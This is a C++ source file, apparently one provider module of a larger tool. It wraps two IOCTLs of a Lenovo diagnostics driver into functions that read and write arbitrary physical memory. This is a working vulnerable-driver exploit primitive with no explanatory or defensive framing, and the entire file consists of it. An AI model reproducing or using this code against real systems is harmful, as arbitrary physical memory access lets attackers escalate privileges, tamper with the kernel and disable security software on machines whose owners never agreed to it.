#include "providers/lenovo.hpp"

#include <algorithm>
#include <cstdint>
#include <cstring>
#include <stdexcept>
#include <string>

namespace
{
    constexpr DWORD k_ioctl_physical_read = 0x222010;
    constexpr DWORD k_ioctl_physical_write = 0x222014;

    struct read_request
    {
        DWORD64 address;
        DWORD64 length;
    };

    struct write_request
    {
        DWORD64 address;
        DWORD map_size;
        DWORD magic;
        DWORD64 source;
    };
} // namespace

namespace providers
{
    lenovo_diagnostics::lenovo_diagnostics( ) {
        handle_ = CreateFileW( device_path( ) , GENERIC_READ | GENERIC_WRITE , 0 , nullptr , OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL , nullptr );
        if ( handle_ == INVALID_HANDLE_VALUE )
        {
            throw std::runtime_error( "CreateFile failed, GetLastError=" + std::to_string( GetLastError( ) ) );
        }
    }

    lenovo_diagnostics::~lenovo_diagnostics( ) {
        if ( handle_ != INVALID_HANDLE_VALUE )
            CloseHandle( handle_ );
    }

    bool lenovo_diagnostics::read_phys( void* address , void* buffer , std::size_t size ) const
    {
        auto physical = reinterpret_cast< uint64_t >( address );
        auto output = static_cast< uint8_t* >( buffer );
        while ( size ) {
            read_request request {};
            request.address = physical;
            request.length = sizeof( uint64_t );

            uint64_t value = 0;
            DWORD returned = 0;
            if ( !DeviceIoControl( handle_ , k_ioctl_physical_read , &request , sizeof( request ) , &value , sizeof( value ) , &returned , nullptr ) )
            {
                return false;
            }

            std::size_t chunk = ( std::min ) ( size , sizeof( value ) );
            memcpy( output , &value , chunk );
            output += chunk;
            physical += chunk;
            size -= chunk;
        }
        return true;
    }

    bool lenovo_diagnostics::write_phys( void* address , void* buffer , std::size_t size ) const
    {
        auto physical = reinterpret_cast< uint64_t >( address );
        auto source = static_cast< uint8_t* >( buffer );
        while ( size )
        {
            DWORD chunk = size >= 8 ? 8 : size >= 4 ? 4 : size >= 2 ? 2 : 1;
            write_request request {};
            request.address = physical;
            request.map_size = chunk;
            request.magic = 0x6C61696E;
            request.source = reinterpret_cast< DWORD64 >( source );

            DWORD returned = 0;
            if ( !DeviceIoControl( handle_ , k_ioctl_physical_write , &request , sizeof( request ) , nullptr , 0 , &returned , nullptr ) ) {
                return false;
            }

            physical += chunk;
            source += chunk;
            size -= chunk;
        }
        return true;
    }
} // namespace providers
